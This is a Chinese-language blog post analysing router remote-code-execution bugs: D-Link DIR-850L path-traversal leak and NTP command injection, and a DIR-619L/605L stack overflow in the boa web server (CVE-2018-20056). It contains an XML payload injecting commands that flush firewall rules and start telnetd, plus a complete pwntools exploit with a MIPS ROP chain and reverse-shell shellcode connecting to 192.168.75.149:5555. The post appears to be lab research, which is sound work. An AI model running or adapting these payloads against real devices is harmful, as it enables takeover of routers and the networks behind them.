---
title: '路由器相关RCE漏洞分析'
date: 2019-10-05
updated: 2019-10-10
category: 'IOT'
tags:
  - 'IOT'
  - 'RCE'
lang: 'zh'
draft: false
---
## 复习一下基本知识

### postgresql数据库操作

如果是安装好了`postgresql`数据库就会新建一个`postgreql`用户

`sudo su - postgres`切换到`postgresql`

`psql`就可以直接登陆

基本操作如下：

`\l`列出所有的数据库  
`\c`选择数据库  
`\dt`列出所有表  
`\d`描述表的信息

使用`firmadyne`会将信息保存到`postgresql`数据库中

### ubuntu安装burp

[下载地址](http://labfile.oss.aliyuncs.com/courses/726/burpsuite_free.jar)

然后`java -jar .jar`就可以启动了

![](/2019/10/05/lu-you-qi-xiang-guan-rce-lou-dong-fen-xi/burp)

## D-Link850L RCE分析

[参考文章](https://xz.aliyun.com/t/90?accounttraceid=9e7417ba-17e6-409c-ae12-af7205701caa#toc-0)

信息泄露

位于`fatlady.php`文件中，很明显的看到了参数拼接的行为

![](/2019/10/05/lu-you-qi-xiang-guan-rce-lou-dong-fen-xi/assets/d-link)

构造恶意数据发送

```xml
<?xml version="1.0" encoding="utf-8" ?><postxml><module><service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service></module></postxml>
```

可以看到其解析了但是并没有返回数据

![](/2019/10/05/lu-you-qi-xiang-guan-rce-lou-dong-fen-xi/assets/burp2.png)

尝试多次均失败，于是用默认密码直接登录上去

漏洞点：

```php
$server = query("/device/time/ntp/server");
$period = query("/device/time/ntp/period");	if ($period=="") $period="604800";
$period6 = query("/device/time/ntp6/period");	if ($period6=="") $period6="604800";
$ntp_run = "/var/run/ntp_run.sh";

if ($enable==1 && $enablev6==1)
{
	if ($server=="") fwrite(a, $START, 'echo "No NTP server, disable NTP client ..." > /dev/console\n');
	else
	{
		fwrite(w, $ntp_run, '#!/bin/sh\n');
		fwrite(a, $ntp_run,
			'echo "Run NTP client ..." > /dev/console\n'.
			'echo [$1] [$2] > /dev/console\n'.
			'STEP=$1\n'.
			'RESULT="Null"\n'.
			'xmldbc -s /runtime/device/ntp/state RUNNING\n'.
			'SERVER4='.$server.'\n'.
			'SERVER6=`xmldbc -g /runtime/device/ntp6/server | cut -f 1 -d " "`\n'.
			'if [ "$STEP" == "V4" ]; then\n'.
			'	xmldbc -t "ntp:'.$period.':'.$ntp_run.' $STEP"\n'.
			'	echo "ntpclient -h $SERVER4 -i 5 -s -4" > /dev/console\n'.
			'	ntpclient -h $SERVER4 -i 5 -s -4 > /dev/console\n'.
```

这里直接把`$server`变量拼接在了命令执行的代码中，存在命令注入

首先，获取DEVICE.TIME服务的xml文件格式

![](/2019/10/05/lu-you-qi-xiang-guan-rce-lou-dong-fen-xi/assets/burp4.png)

但是格式好像有问题

使用如下payload尝试

```xml
<?xml version="1.0" encoding="utf-8" ?>
<postxml>
	<module>
		<service>DEVICE.TIME</service>
		<device>
			<time>
				<ntp>
					<enable>1</enable>
					<period>604800</period>
					<server>metelesku;(iptables -F ;iptables -X;iptables -t nat -F;iptables -t nat -X;iptables -t mangle -F;iptables -t mangle -X;iptables -P INPUT ACCEPT; iptables -P FORWARD ACCEPT;iptables -P OUTPUT ACCEPT;telnetd -p 23090 -l /bin/date) &amp; exit;</server>
				</ntp>
				<ntp6>
					<enable>1</enable>
					<period>604800</period>
				</ntp6>
				<timezone>63</timezone>
				<time/>
				<date/>
				<dst>0</dst>
				<dstmanual/>
				<dstoffset/>
			</time>
		</device>
	</module>
</postxml>
```

但是还是失败了

![](/2019/10/05/lu-you-qi-xiang-guan-rce-lou-dong-fen-xi/assets/burp3.png)

## DIR-619L&605L 栈溢出漏洞

漏洞点在`/bin/boa`程序处

通过`ghidra`反编译代码可以看到：

`formLanguageChange`函数

```c
    if (pcVar2 != (char *)0x0) {
      strncpy(local_f8,__s1,(size_t)(pcVar2 + -(int)__s1));
      local_f8[(int)(pcVar2 + -(int)__s1)] = 0;
      goto LAB_00460b34;
    }
    uVar3 = websGetVar(uParm1,"currTime",&DAT_004ac874);
  }
  //formLanguageChange接下来调用了sprintf危险函数向local_f8变量中读入参数内容
  sprintf(local_f8,"%s?t=%s",__s1,uVar3);
LAB_00460b34:
  websRedirect(uParm1,local_f8); //websRedirect使用了local_f8作为参数。
  system("echo 4 > /proc/gpio");
  iVar1 = apmib_update(4);
```

`websGetVar`函数获取到参数之火传入`uVar3`变量，之后`sprintf`函数将其写入到`local_f8`中，再调用`websRedirect`函数进行URL跳转

`websGetVar`函数

```c
  }
  //websGetVar通过malloc、memcpy将获取到的参数返回给formLanguageChange。
  if (-1 < (int)__n) {
    pvParm3 = malloc(__n + 1);
    memcpy(pvParm3,query_temp_var,__n);
    *(undefined *)((int)pvParm3 + __n) = 0;
    addTempStr(pvParm3);
  }
  return pvParm3;
}
```

继续分析`websRedirect`函数

```c
undefined4 websRedirect(int iParm1,char *pcParm2)

{
  char *pcVar1;
  
  *(undefined4 *)(iParm1 + 0x50) = 0;
  pcVar1 = strstr(pcParm2,"/apply_setting.asp");
  if (pcVar1 != (char *)0x0) {
    apply_setting_redirect = apply_setting_redirect + 1;
  }
  send_r_moved_perm(iParm1,pcParm2);
  return 0;
}
```

可以看到调用了`send_r_moved_perm`函数

```c
req_write(iParm1,uVar1);
req_write(iParm1,&DAT_004a1f14);
pcVar2 = strstr(pcParm2,"http://");
if (pcVar2 == (char *)0x0) {
  if (*pcParm2 == '/') {
    pcParm2 = pcParm2 + 1;
  }
  sprintf(acStack224,"http://%s/%s",*(undefined4 *)(iParm1 + 0x70),pcParm2);
  pcParm2 = acStack224;
}
sprintf(acStack480,
                  
        "<html><head></head><body>\r\n\t\tThis document has moved to a new <ahref=\"%s\">location</a>.\r\n\t\tPlease update your documents to reflect the newlocation.\r\n\t\t</body></html>\r\n"
        ,pcParm2);
req_write(iParm1,acStack480);
```

在`send_r_moved_perm`函数中两次调用了`sprintf`函数分别向acStack224(sp+0x19f8-0xe0)和acStack480(sp+0x19f8-0x1e0)中输入字符。

> 通过第二两个sprintf修改返回地址，构造ROP链，导致程序控制流被劫持。（也可以通过两个sprintf的配合来实现栈的迁移，漏洞作者是这么实现的）

在mips虚拟机中尝试运行程序但是失败了,`firmadyne`模拟固件也没成功

记录一下其实是文件损坏了所以qemu模拟不了

```
ecutable, MIPS, MIPS-I version 1 (SYSV), dynamically linked (uses shared libs), corrupted section header size
```

在我的WSL中使用最新的qemu是可以模拟的

```
➜  squashfs-root-0 sudo chroot . ./qemu ./bin/boa                                                                       Initialize AP MIB failed!
qemu: uncaught target signal 11 (Segmentation fault) - core dumped
[1]    363 segmentation fault (core dumped)  sudo chroot . ./qemu ./bin/boa
```

那看来需要更新一下qemu版本了

![](/2019/10/05/lu-you-qi-xiang-guan-rce-lou-dong-fen-xi/assets/IOT0.png)

记录一下exp

```python
import requests
import sys
import struct
from pwn import *
#context.log_level='debug'
context.arch='mips'
context.endian='big'
ip='192.168.75.150'

def syscmd1(a):
    p=remote(ip,80)
    z=len(a)
    print "[+]len:"+str(z)
    payload=''
    payload+='POST /goform/formLanguageChange HTTP/1.1\r\n'
    payload+='Host: '+ip+'\r\n'
    payload+='Connection: keep-alive\r\n'
    payload+='Accept-Encoding: gzip, deflate\r\n'
    payload+='Accept: */*\r\n'
    payload+='User-Agent: python-requests/2.18.4\r\n'
    payload+='Content-Length: '+str(z+9)+'\r\n'
    payload+='Content-Type: application/x-www-form-urlencoded\r\n'
    payload+='\r\n'
    payload+='currTime='
    payload+=a+'\r\n'
    p.send(payload)
    p.recvuntil('</html>')
    #raw_input()
    p.close()

#base address of libc.so.0
base1=0x2ab88000
###shellcode
sc=struct.pack(">I",0x24060101)
sc+=struct.pack(">I",0x04d0ffff)
sc+=struct.pack(">I",0x2806ffff)
sc+=struct.pack(">I",0x27bdffe0)
sc+=struct.pack(">I",0x27e41001)
sc+=struct.pack(">I",0x2484f023)
sc+=struct.pack(">I",0xafa4ffe8)
sc+=struct.pack(">I",0xafa0ffec)
sc+=struct.pack(">I",0x27a5ffe8)
sc+=struct.pack(">I",0x24020fab)
sc+=struct.pack(">I",0xafa00108)
sc+=struct.pack(">I",0x0101010c)
sc+="/bin//sh\x00"

shellcode =''
shellcode += asm(shellcraft.connect('192.168.75.149',5555))
shellcode += asm(shellcraft.dup2(5,0))
shellcode += asm(shellcraft.dup2(5,1))
shellcode += sc

s0=struct.pack(">I",base1+0x2C794)
s1=struct.pack(">I",base1+0x2C794)### rop2:move $t9,$s2;...;jr $t9 
s2=struct.pack(">I",base1+0x24b70)### rop3:sleep(1)
s3=struct.pack(">I",base1+0x2bdac)### rop5:addiu $a0,$sp,0x18;...;lw $ra,0x30;jr $ra
s4=struct.pack(">I",base1+0x2bdac)
###rop
payload1='a'*0x167+s0+s1+s2+s3
payload1+=struct.pack(">I",base1+0x25714)  ###rop1: li $a0,1;move $t9,$s1;jalr $t9;ori $a1,$s0,2
payload1+='b'*0x1c+s0+s1+s2+s3+s4
payload1+=struct.pack(">I",base1+0x5f98)  ###rop4:lw $ra,0x1c($sp);...;jr $ra
payload1+='c'*0x1c
payload1+=s3
payload1+='d'*0x18
payload1+=struct.pack(">I",0x24910101) ###rop7 addiu $s1,$a0,257;addi $s1,$s1,-257;move $t9,$s1;jalr $t9
payload1+=struct.pack(">I",0x2231feff)
payload1+=struct.pack(">I",0x0220c821)
payload1+=struct.pack(">I",0x0320f809)
payload1+=struct.pack(">I",0x2231feff)
payload1+=struct.pack(">I",0x2231feff)
payload1+=struct.pack(">I",base1+0x2bda0) ###rop6:mov $t9,$a0;...;jalr $t9
payload1+='e'*0x20+shellcode
if __name__ == "__main__":
    syscmd1(payload1)
```

## 参考

[D-Link-Dir-850L-远程命令执行漏洞](https://xz.aliyun.com/t/90?accounttraceid=9e7417ba-17e6-409c-ae12-af7205701caa#toc-0)

[路由器漏洞分析系列（2）：CVE-2018-20056 DIR-619L&605L 栈溢出漏洞分析及复现](https://xz.aliyun.com/t/5699#toc-0)
